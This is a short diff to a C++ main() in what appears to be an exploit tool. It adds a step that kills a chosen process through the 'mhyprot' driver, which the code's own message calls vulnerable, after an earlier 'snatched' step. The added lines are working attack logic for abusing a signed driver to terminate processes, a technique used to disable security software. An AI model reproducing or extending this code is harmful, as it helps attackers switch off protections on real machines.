@@ -295,6 +295,17 @@ int main()
         UDBG("[<] snatched\n\n");
     }
 
+    UDBG("\n[>] Terminating target process using vulnerable driver...\n");
+
+    if (libmhyprot::terminate_process(process_id))
+    {
+        UDBG("[+] successfully terminated!\n\n");
+    }
+    else
+    {
+        UDBG("[+] failed to terminate.\n\n");
+    }
+
     UDBG("[<] done\n");
 
     libmhyprot::mhyprot_unload();
